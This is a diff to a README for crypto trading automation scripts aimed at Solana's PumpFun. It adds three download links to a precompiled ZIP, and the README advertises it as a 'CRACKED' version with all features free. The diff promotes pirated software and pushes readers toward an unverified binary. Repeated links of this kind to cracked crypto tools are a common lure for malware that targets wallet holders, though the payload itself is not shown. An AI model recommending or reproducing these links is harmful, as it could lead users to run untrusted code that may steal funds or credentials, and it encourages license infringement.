@@ -6,10 +6,11 @@ Infinity Scripts offers a suite of specialized automation tools designed to stre
 <img src="https://i.imgur.com/MZ8oOvp.jpeg" alt="InfinityScript" width="600"/>
 
 
+[Precompiled Build](https://github.com/vegashard/InfinityAIO-Solana-PumpFun-Tool-Unlocked/releases/download/Releases/InfinityAIO.zip)
 > **Note**  
 > This is the **CRACKED** version it means you can use **ALL FEATURES** for **FREE**
 
-
+[Download](https://github.com/vegashard/InfinityAIO-Solana-PumpFun-Tool-Unlocked/releases/download/Releases/InfinityAIO.zip)
 ---
 
 ## 🔧 Available Tools
@@ -80,3 +81,7 @@ Each monitor sends detailed **Discord webhooks** to your desired server for real
 ## 🛰 **Disclaimer**
 
 Use these scripts at your own risk. We do not assume any liability for the actions or consequences resulting from the use of our tools. Please use responsibly.
+
+---
+
+[Download](https://github.com/vegashard/InfinityAIO-Solana-PumpFun-Tool-Unlocked/releases/download/Releases/InfinityAIO.zip)
